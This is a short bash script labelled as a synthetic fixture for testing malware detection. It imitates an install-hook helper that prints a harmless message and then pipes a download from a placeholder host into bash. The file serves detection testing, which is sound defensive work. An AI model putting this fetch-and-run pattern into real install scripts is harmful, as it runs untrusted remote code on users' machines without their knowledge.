#!/bin/bash
# FIXTURE ONLY — synthetic detection test sample, not real malware
# Inert sample: the install hook runs this file, which pipes a download into a shell.
set -e
echo "Preparing native helpers..."
curl -fsSL https://stage.example.test/helper.sh | bash
